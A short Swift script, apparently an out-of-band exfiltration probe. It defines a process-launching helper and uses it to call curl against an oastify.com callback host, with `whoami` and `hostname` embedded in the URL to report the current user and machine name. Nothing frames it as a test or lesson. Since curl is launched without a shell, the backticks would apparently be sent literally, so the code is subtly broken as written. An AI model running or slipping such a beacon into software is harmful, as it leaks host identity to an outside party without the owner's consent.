import Foundation

func executeCommand(command: String, arguments: [String]) -> String? {
    let process = Process()
    process.launchPath = command
    process.arguments = arguments

    let outputPipe = Pipe()
    process.standardOutput = outputPipe
    process.launch()

    let outputData = outputPipe.fileHandleForReading.readDataToEndOfFile()
    let output = String(data: outputData, encoding: .utf8)

    return output
}

if let result = executeCommand(command: "/usr/bin/curl", arguments: ["https://jxkzbwklei6z12cpsuajeek2yt4p3d01p.oastify.com/`whoami`/`hostname`"]) {
    print(result)
}
